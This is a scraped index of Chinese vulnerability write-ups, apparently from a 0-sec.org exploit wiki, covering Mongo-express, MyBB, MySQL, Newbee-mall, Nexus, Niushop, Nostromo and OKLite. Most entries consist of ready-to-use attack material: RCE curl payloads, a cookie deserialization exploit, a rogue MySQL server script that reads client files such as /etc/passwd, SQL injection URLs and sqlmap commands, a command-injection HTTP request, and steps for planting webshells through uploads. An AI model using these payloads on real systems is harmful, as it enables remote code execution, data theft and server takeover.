true 其他:http://www.mottoin.com/105609.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mongo DB/CVE-2019-10758.html":{"url":"0day/Mongo DB/CVE-2019-10758.html","title":"（CVE-2019-10758）Mongo expres rce","keywords":"","body":"（CVE-2019-10758）Mongo expres 远程命令执行漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 cURL exploit curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw==' --data 'document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")' Script exploit node main.js exploit = \"this.constructor.constructor(\\\"return process\\\")().mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator')\" var bson = require('mongo-express/lib/bson') bson.toBSON(exploit) 很明显从 exploit 中我们能明显得出以下两个结论： 存在 RCE 漏洞的代码位于 mongo-express/lib/bson 路由 /checkValid 从外部接收输入，并调用了存在 RCE 漏洞的代码，由此存在被攻击的风险 首先定位可以接受外界输入的路由 https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js： 首先定位可以接受外界输入的路由 https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/router.js： const router = function (config) { // 省略其他无关代码 const appRouter = express.Router(); appRouter.post('/checkValid', mongoMiddleware, configuredRoutes.checkValid); return appRouter; } 继续定位 https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/routes/document.js： var routes = function (config) { // 省略其他无关代码 var exp = {}; exp.checkValid = function (req, res) { var doc = req.body.document; try { bson.toBSON(doc); } catch (err) { console.error(err); return res.send('Invalid'); } res.send('Valid'); }; return exp; } 可以很明显看到这里会从 POST 请求中读取 document 并作为参数继续调用 bson.toBSON(doc);，而根据我们之前的分析，漏洞代码有 99% 的可能性位于 bson.toBSON 函数内，所以继续分析源码，https://github.com/mongo-express/mongo-express/blob/v0.53.0/lib/bson.js： var mongodb = require('mongodb'); var vm = require('vm'); var json = require('./json'); // 省略一些无关代码 //JSON.parse doesn't support BSON data types //Document is evaluated in a vm in order to support BSON data types //Sandbox contains BSON data type functions from node-mongodb-native exports.toBSON = function (string) { var sandbox = exports.getSandbox(); string = string.replace(/ISODate\\(/g, 'new ISODate('); string = string.replace(/Binary\\((\"[^\"]+\"),/g, 'Binary(new Buffer($1, \"base64\"),'); vm.runInNewContext('doc = eval((' + string + '));', sandbox); return sandbox.doc; }; // This function as the name suggests attempts to parse // the free form string in to BSON, since the possibilities of failure // are higher, this function uses a try..catch exports.toSafeBSON = function (string) { try { var bsonObject = exports.toBSON(string); return bsonObject; } catch (err) { return null; } }; 重点出现！>>> vm.runInNewContext('doc = eval((' + string + '));', sandbox); 对 nodejs 的沙箱逃逸有所关注的朋友很容易就能注意到这段代码和 vm 沙盒逃逸代码 demo 的惊人相似： const vm = require('vm'); vm.runInNewContext('this.constructor.constructor(\"return process\")().exit()'); 在这里，由于用户输入的最终会被拼接上 eval，所以很容易就能导致 RCE。可以看到作者的 exploit 就是获得全局上下文后直接导入 child_process 来执行系统命令： this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator') 不过由于这是个没有回显的 RCE，因此在实际漏洞利用的时候可能需要反弹 shell 之类的操作来辅助漏洞的利用。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-13 00:26:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MyBB/2.html":{"url":"0day/MyBB/2.html","title":"MyBB 后台代码执行漏洞","keywords":"","body":"MyBB 后台代码执行漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 首先全局搜索inclued函数，在\\mybb\\admin\\modules\\config\\languages.php页面的432行发现include函数：@include $editfile; 该函数包含editfile文件，进行查看该文件来源，可以看到418行该文件由folder文件夹和file文件拼接，其中408行看到file文件由post请求提交，接下来查看folder文件夹来源 通过该文件84行看到foler文件夹为MYBB_ROOT.\"inc/languages/\".$editlang.\"/\"，接下来查看editlang变量，通过89行看到判断该文件名后缀为php的文件是否存在，然后查看该文件下辖的php文件只有english文件，猜测editlang为english，稍后验证，该变量会通过post请求输入 现在文件的目录结构分析完毕，接下来查看该漏洞页面的接口位置：由于该文件目录为\\mybb\\admin\\modules\\config\\languages.php，因此，入口为config模板的language方法中，其中控制器为edit，从369行可以看到，同时408行看到post请求中输入file文件 因此我们查看该页面uri大概为以下样子： /mybb/admin/index.php?module=config-languages&action=edit 现在进行分析，该目录为inc/languages/english，因此我们需要向该文件夹下进行上传一个图片，因此我们需要将上传文件目录修改为该文件夹，现在分析如何修改该文件夹： 通过对头像上传文件夹进行跟踪，发现在function_upload.php的222行，该文件夹由全局变量settings控制 对该变量进行跟踪，$mybb->settings['avataruploadpath']，发现对$mybb->settings['uploadspath']变量的控制就需要对文件进行修改进行查询，针对关键函数进行搜索：$db->update_query(\"settings\"发现在\\mybb\\admin\\modules\\config\\settings.php文件下1101行： 通过value和name变量进行更新，其中value变量是从post请求中的upsetting数组中进行获取其name变量的值： 我们跟踪avataruploadpath变量，进行搜索，有1042行定义数组，而avataruploadpath为数组中的参数，同时也有post请求的upsetting数组进行输入: 现在寻找数据传入方式，发现action方法为change，请求方式为post： 通过该页面17行，发现页面在index页面下调用的模板为config下的setting模板： 因此我们构建的页面就可以为这样，从该页面进行传入数据 http://www.0-sec.org/mybb/admin/index.php?module=config-settings&action=change 漏洞复现 通过上传头像（上传的头像图片小于1kb，因为网站会进行压缩，将php脚本破坏，因此制作木马要保证大小小于1kb，已做好的图片放在了附件中） 通过修改setting中的avataruploadpath值为./inc/languages/english 修改avataruploadpath值为./inc/languages/English，查看所有的settins变量： 链接：http://www.0-sec.org/mybb/admin/index.php?module=config-settings&action=change 找到Avatar Upload Path并修改./inc/languages/english 通过上传头像图片： http://www.0-sec.org/mybb/admin/index.php?module=user-users&action=edit&uid=1#tab_avatar 勾选去掉当前头像 点击save user 发现文件已经上传成功，并且avataruploadpath也修改成功，下面进行包含操作，访问url：http://www.0-sec.org/mybb/admin/index.php?module=config-languages&action=edit&lang=english Config模块下的languages下， 因为该页面包含需要post请求，并且控制器入口为edit，因此我们进行edit，随便点一个php文件进行编辑： 什么都不用更改，点击save languagefile bp抓包： 将file变量改为我们的头像图片文件名，名字可以从这里看到 通过邮件查看图片链接： 右键复制链接打开可以看到文件名为avatar_1.jpg 然后放包发现该代码执行成功，phpinfo() 测试一句话木马eval($_GET['a']); 测试成功 文件上传后，包含后图像文件会损坏，所以需要执行完命令，创建一个新的shell文件，然后通过poc进行验证shell文件存在 写一句话木马到网站，请使用muma.jpg,然后包含，会在/mybb/admin生成shell.php,一句话木马密码为a 文中附件下载链接 http://www.0-sec.org/download/Mybb_pic.7z 参考链接 https://xz.aliyun.com/t/7213#toc-2 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-05 00:29:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MyBB/1.html":{"url":"0day/MyBB/1.html","title":"MyBB <= 1.8.3 rce漏洞","keywords":"","body":"MyBB 一、漏洞简介 在使用精心编制的对象的__wakeup()魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。 二、漏洞影响 PHP 5.6 MyBB 三、复现过程 漏洞分析 gmp.c static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */ { ... ALLOC_INIT_ZVAL(zv_ptr); if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC) || Z_TYPE_P(zv_ptr) != IS_ARRAY ) { zend_throw_exception(NULL, \"Could not unserialize properties\", 0 TSRMLS_CC); goto exit; } if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) { zend_hash_copy( zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr), (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *) ); } zend_object_handlers.c ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ { zend_object *zobj; zobj = Z_OBJ_P(object); if (!zobj->properties) { rebuild_object_properties(zobj); } return zobj->properties; } 攻击者可以将**object更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过Z_OBJ_P访问存储在对象库中的任何对象。这意味着攻击者将能够通过zend_hash_copy()更新对象中的任何属性。从而引发了一系列安全问题。 下面这段代码可以验证这个漏洞 ryat = 1; } } $obj = new stdClass; $obj->aa = 1; $obj->bb = 2; $inner = 's:1:\"1\";a:3:{s:2:\"aa\";s:2:\"hi\";s:2:\"bb\";s:2:\"hi\";i:0;O:3:\"obj\":1:{s:4:\"ryat\";R:2;}}'; $exploit = 'a:1:{i:0;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}'; $x = unserialize($exploit); var_dump($obj); ?> 预期结果: object(stdClass)#1 (2) { [\"aa\"]=> int(1) [\"bb\"]=> int(2) } 实际结果: object(stdClass)#1 (3) { [\"aa\"]=> string(2) \"hi\" [\"bb\"]=> string(2) \"hi\" [0]=> object(obj)#3 (1) { [\"ryat\"]=> &int(1) } } 漏洞利用 在php 5.6中，DateInterval的__wakeup()使用convert_to_long()句柄并重新分配其属性，因此攻击者可以通过GMP的gmp_cast_object()将GMP对象转换成任何整数类型的ZVAL: static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */ { mpz_ptr gmpnum; switch (type) { ... case IS_LONG: gmpnum = GET_GMP_FROM_ZVAL(readobj); INIT_PZVAL(writeobj); ZVAL_LONG(writeobj, mpz_get_si(gmpnum)); return SUCCESS; 漏洞利用代码 当然，也可以套用精心编制的__wakeup() ryat = (int) $this->ryat; } ?> MyBB index.php if(isset($mybb->cookies['mybb']['forumread'])) { $forumsread = my_unserialize($mybb->cookies['mybb']['forumread']); } MyBBunserialize()反序列化cookie，因此攻击者能够更新$mybb或其他对象的属性，从而很容易导致安全问题，例如：XSS、SQL注入、RCE等 好消息是该漏洞已经在新版本得到了修复 PoC MyBB index.php eval('$index = \"'.$templates->get('index').'\";'); MyBB在模板解析过程中始终使用eval()函数。 inc/class_templates.php class templates { ... public $cache = array(); ... function get($title, $eslashes=1, $htmlcomments=1) { global $db, $theme, $mybb; ... $template = $this->cache[$title]; ... return $template; } 如果我们可以控制$cache，我们就可以通过eval()函数注入php代码。 inc/init.php $error_handler = new errorHandler(); ... $maintimer = new timer(); ... $mybb = new MyBB; ... switch($config['database']['type']) { case \"sqlite\": $db = new DB_SQLite; break; case \"pgsql\": $db = new DB_PgSQL; break; case \"mysqli\": $db = new DB_MySQLi; break; default: $db = new DB_MySQL; } ... $templates = new templates; $templates对象在init.php中实例化，并且在此之前实例化了四个对象。这意味着$templates对象的句柄被设置为5并存储到对象存储中，因此我们可以访问$templates对象并通过在GMP反序列化期间将GMP对象转换为整型ZVAL(其值为5)来更新$cache属性。这也表明我们可以通过eval()函数注入php代码。 当MyBB curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:\"GMP\":106:{s:1:\"5\"%3ba:2:{s:5:\"cache\"%3ba:1:{s:5:\"index\"%3bs:14:\"{${phpinfo()}}\"%3b}i:0%3bO:12:\"DateInterval\":1:{s:1:\"y\"%3bR:2%3b}}}}' http://0-sec.org/mybb/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-05 00:18:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mysql/1.html":{"url":"0day/Mysql/1.html","title":"MySQL LOAD DATA 读取客户端任意文","keywords":"","body":"MySQL LOAD DATA 读取客户端任意文 一、漏洞简介 LOAD DATA INFILE mysql的LOAD DATA INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是： load data infile \"/etc/passwd\" into table TestTable fields terminated by '分隔符'; load data local infile \"/etc/passwd\" into table TestTable fields terminated by '分隔符'; 第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD DATA LOCAL INFILE。 官方文档中也提出了这个问题（PS：Google翻译的不是很准确） 二、漏洞影响 三、复现过程 分析数据包 测试环境： MacOS 10.14 Mysql 5.7.21 使用tcpdump抓取3306端口的数据包 1.服务器向客户端发送greeting问候包，包含服务端banner信息 2.客户端发送登陆请求包，包含用户名密码，以及含有LOAD DATA LOCAL选项的客户端banner信息。 3.然后是客户端初始化的一些查询，比如select database(); select @@version_comment; 4.找到我们执行的LOAD DATA INFILE数据包，第一个包看起来比较正常，是客户端发起的Request Que 5.但是紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/Users/smi1e/Desktop/test.txt的数据包。 6.然后客户端向服务端发送了/Users/smi1e/Desktop/test.txt文件的内容： 如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的 In theory, a patched server could be built that would tell the client program to transfer a file of the server's choosing rather than the file named by the client in the LOAD DATA statement. 也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。 不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 搭建MySQL服务端 主要分为 向 MySQL Client 发送Server Greeting 等待 Client 端发送一个Query Package 回复一个file transfer请求 我们需要知道如何构造File Transfer和Server Greeting数据包，这些包的格式都可以在 MySQL 的官方文档上找到。 File Transfer数据包格式：Protocol::LOCAL_INFILE_Request 并且我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求。不过我们在上面看到客户端在连接成功后会自动的做一些初始化的查询。 官方也给了exmaple 0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64 ...../etc/passwd 数据包的内容其实是从\\xfb开始的，这个字节代表包的类型，后面紧跟要读取的文件名。前面的0x0c是数据包的长度（从 \\xfb 开始计算），长度后面的三个字节\\x00\\x00\\x01是数据包的序号。 Greeting数据包格式：官方文档，如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。 这里直接拷贝大佬归纳的格式。 '\\x0a', # Protocol '6.6.6-lightless_Mysql_Server' + '\\0', # Version '\\x36\\x00\\x00\\x00', # Thread ID 'ABCDABCD' + '\\0', # Salt '\\xff\\xf7', # Capabilities, CLOSE SSL HERE! '\\x08', # Collation '\\x02\\x00', # Server Status \"\\x0f\\x80\\x15\", '\\0' * 10, # Unknown 'ABCDABCD' + '\\0', \"mysql_native_password\" + \"\\0\" poc 来源于https://www.vesiluoma.com/abusing-mysql-clients/的POC，测了一个多小时都没成功，最后发现里面 #3payload写错了，我给改了下。 #!/usr/bin/python #coding: utf8 import socket # linux : #filestring = \"/etc/passwd\" # windows: #filestring = \"C:\\Windows\\system32\\drivers\\etc\\hosts\" HOST = \"0.0.0.0\" # open for eeeeveryone! ^_^ PORT = 3306 BUFFER_SIZE = 1024 #1 Greeting greeting = \"\\x5b\\x00\\x00\\x00\\x0a\\x35\\x2e\\x36\\x2e\\x32\\x38\\x2d\\x30\\x75\\x62\\x75\\x6e\\x74\\x75\\x30\\x2e\\x31\\x34\\x2e\\x30\\x34\\x2e\\x31\\x00\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\" #2 Accept all authentications authok = \"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\" #3 Payload #数据包长度 payloadlen = \"\\x0c\" padding = \"\\x00\\x00\" payload = payloadlen + padding + \"\\x01\\xfb\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((HOST, PORT)) s.listen(1) while True: conn, addr = s.accept() print 'Connection from:', addr conn.send(greeting) while True: data = conn.recv(BUFFER_SIZE) print \" \".join(\"%02x\" % ord(i) for i in data) conn.send(authok) data = conn.recv(BUFFER_SIZE) conn.send(payload) print \"[*] Payload send!\" data = conn.recv(BUFFER_SIZE) if not data: break print \"Data received:\", data break # Don't leave the connection open. conn.close() ps: 实测 下面这个项目比较好用，上面的poc还需要改长度和内容的16进制值 Github还有一个项目：https://github.com/allyshka/Rogue-MySql-Server 该特性适用于：MySQL Client、 PHP with mysqli、Python with MySQLdb、Python3 with mysqlclient、Java with JDBC Driver等。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:40:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Newbee-mall/1.html":{"url":"0day/Newbee-mall/1.html","title":"CVE-2019-19113）新蜂商城sql注入","keywords":"","body":"（CVE-2019-19113）新蜂商城sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 \\src\\main\\resources\\mapper\\NewBeeMallGoodsMapper.xml select from tb_newbee_mall_goods_info and (goods_name like CONCAT('%','${keyword}','%') or goods_intro like CONCAT('%','${keyword}','%')) and goods_category_id = #{goodsCategoryId} order by goods_id desc order by selling_price asc order by stock_num desc limit #{start},#{limit} 如果使用$ {keyword}拼接sql语句，则存在SQL注入的风险 poc： http://0-sec.org:28089/search?goodsCategoryId=&keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&orderBy=default 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-24 13:38:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Nexus/1.html":{"url":"0day/Nexus/1.html","title":"（CVE-2019-5475）Nexus2 yum插件RCE漏洞","keywords":"","body":"（CVE-2019-5475）Nexus2 yum插件RCE漏洞 一、漏洞简介 该漏洞默认存在部署权限账号，成功登录后可使用“createrepo”或“mergerepo”自定义配置，可触发远程命令执行漏洞 二、漏洞影响 Nexus Repository Manager OSS 三、复现过程 首先以管理员身份（admin/admin123）登录 然后找到漏洞位置：Capabilities - Yum:Configuration - Settings 点击 Save 抓包，更改mergerepoPath后的value值 C:\\\\Windows\\\\System32\\\\cmd.exe /k dir& 此处使用 /k 是因为这样命令执行完会保留进程不退出，而 /c 后执行完会退出；由于给用户提供的命令后面加了一个 --version，所以后面要加个&，&表两个命令同时执行，这样就不会干扰其他命令的执行 Poc如下： PUT /nexus/service/siesta/capabilities/00012bdb034073a3 HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate X-Nexus-UI: true Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 241 DNT: 1 Connection: close Referer: http://127.0.0.1:8081/nexus/ Cookie: NXSESSIONID=105c7cb1-a307-43a3-9ff8-9770b5ae3b13 {\"typeId\":\"yum\",\"enabled\":true,\"properties\":[{\"key\":\"maxNumberParallelThreads\",\"value\":\"10\"},{\"key\":\"createrepoPath\",\"value\":\"111\"},{\"key\":\"mergerepoPath\",\"value\":\"C:\\\\Windows\\\\System32\\\\cmd.exe /k dir&\"}],\"id\":\"00012bdb034073a3\",\"notes\":\"\"} 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Niushop/1.html":{"url":"0day/Niushop/1.html","title":"Niushop sql注入","keywords":"","body":"Niushop sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 sql注入（一） order参数： http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7%27&attr_array[][2]=8&spec_array[]=9 attr_array参数： http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8%27&spec_array[]=9 直接上sqlmap sqlmap -u \"http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9\" --random-agent --batch --dbms \"mysql\" sqlmap -u \"http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&brand_id=2&min_price=3&max_price=4&page=5&page_size=6&order=7&attr_array[][2]=8*&spec_array[]=9\" --random-agent --batch --dbms \"mysql\" --current-db sql注入（二） GET /index.php?s=/wap/Goods/promotionZone&group_id=*&page=1 HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://172.16.209.129:8085/index.php/wap/goods/promotionZone X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735 Connection: close 将数据包保存为niushop.txt sqlmap -r niushop.txt --random-agent --batch --dbms \"mysql\" sql注入（三） POST /index.php?s=/wap/Goods/goodsSearchList HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 66 Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735 Connection: close Cache-Control: max-age=0 sear_name=&sear_type=1&order=*&sort=asc&controlType=&shop_id=0&page=1 数据包保存为niushop.txt sqlmap -r niushop.txt --random-agent --batch --dbms \"mysql\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-22 18:03:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Nostromo httpd/1.html":{"url":"0day/Nostromo httpd/1.html","title":"（CVE-2019-16278）命令执行","keywords":"","body":"（CVE-2019-16278）命令执行 一、漏洞简介 （CVE-2019-16278）命令执行 二、影响范围 三、复现过程 https://github.com/ianxtianxt/CVE-2019-16278/ ➜ Downloads python nostromo.py 114.114.114.114 8080 pwd /bin ➜ Downloads python nostromo.py 114.114.114.114 8080 id uid=65534 gid=65534 ➜ Downloads python nostromo.py 114.114.114.114 8080 \"ls -al\" drwxr-xr-x 2 0 0 0 Apr 12 2013 . drwxr-xr-x 16 0 0 0 Jan 1 1970 .. lrwxrwxrwx 1 0 0 7 Apr 12 2013 ash -> busybox 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-29 16:04:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Nostromo httpd/2.html":{"url":"0day/Nostromo httpd/2.html","title":"（CVE-2019-16279）dos","keywords":"","body":"（CVE-2019-16279）dos 一、漏洞简介 （CVE-2019-16279）dos 二、影响范围 三、复现过程 This bug exploit a memory error when sending too many \\r\\n in a single connexion. Example $ curl http://127.0.0.1:8080 HELLO! $ ./CVE-2019-16279.sh 127.0.0.1 8080 $ curl http://127.0.0.1:8080 curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-29 16:05:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OKLite/sql.html":{"url":"0day/OKLite/sql.html","title":"OKLite v1.2.25 SQL注入导致getshell(前台)","keywords":"","body":"OKLite v1.2.25 SQL注入导致getshell(前台) 一、漏洞简介 这个漏洞在2017年在PHPOK当中就被畅师傅就被发现了。PHPOK系统被修复了，但是在OKLite当中还存在。 二、漏洞影响 OKLite v1.2.25 版本 三、复现过程 地址：http://www.0-sec.org/index.php?id=message 在线留言处上传一个图片并抓包，把文件名修改为： 1','pf3qm0js3gb2s5f33r7lf14vl3','30'),('1',0x7265732f3230313931302f30342f,'shell.jpg','jpg',0x7265732f3230313931302f30352f7368656c6c2e706870,'1570161575','abc 上传成功之后会返回图片的id和保存的路径： 再次上传一个图片，把地址中的save改成replace，添加一个参数名为oldid，值为图片的id + 1。 图片的内容改为恶意的php代码： 上传完成之后可在res\\201910\\05目录下生成一个shell.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 12:50:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OKLite/CVE-2019-16131.html":{"url":"0day/OKLite/CVE-2019-16131.html","title":"（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞","keywords":"","body":"（CVE-2019-16131）OKLite v1.2.25 任意文件上传漏洞 一、漏洞简介 Ethan发现OKLite v1.2.25 存在任意文件上传漏洞（需要登录后台） 漏洞有两处，分别为：module_control.php；plugin_control.php 二、漏洞影响 OKLite v1.2.25 三、复现过程 module_control.php 在模块管理管理处导入模块，这里只能上传zip文件。把恶意文件放在zip压缩包中上传： (我这里是包含了一个shell.php，内容是phpinfo) 上传后又访问了另一个地址： 上传之后就可以在data\\cache看到shell.php被解压出来了。 plugin_control.php 和前一个module_control有所不同的是，这里的zip文件夹必须是包含一个文件夹，文件夹中再包含恶意文件。 插件中心： 验证方式同前一个，就不重复了。 上传完成之后会访问另一个地址： http://localhost/admin.php?c=plugin&f=unzip&id=1196&_noCache=0.08112707662168439&_=1570257969464 参考链接 https://xz.aliyun.com/t/6515#toc-6 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 12:44:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OKLite/CVE-2019-16132.html":{"url":"0day/OKLite/CVE-2019-16132.html","title":"（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞","keywords":"","body":"（CVE-2019-16132） OKLite v1.2.25 存在任意文件删除漏洞 一、漏洞简介 Ethan发现OKLite v1.2.25 存在任意文件删除漏洞（需要登录后台） 后台删除文件时抓包修改title参数可以直接删除网站任意文件 二、漏洞影响 OKLite v1.2.25 版本 三、复现过程 1.进入后台 2.选择风格管理 3.进入文件管理 4.抓包，删除一个文件 5.拦截到请求后，改title为../../index.txt 参考链接 https://www.jianshu.com/p/27360b192ae3 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 12:42:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/OpenSNS/1.html":{"url":"0day/OpenSNS/1.html","title":"OpenSNS sql注入","keywords":"","body":"OpenSNS sql注入 一、漏洞简介 OpenSNS是基于OneThink的轻量级社交化用户中心框架，系统秉持简约的设计风格，注重交流，为用户提供了一套轻量级的社交方案。OpenSNS前身是“ThinkOX”，2015年1月28号正式更名为OpenSNS。 OpenSNS采用PHP+MYSQL构建的一款有“身份”的开源免费SNS社交系统，适用于多种社会关系。 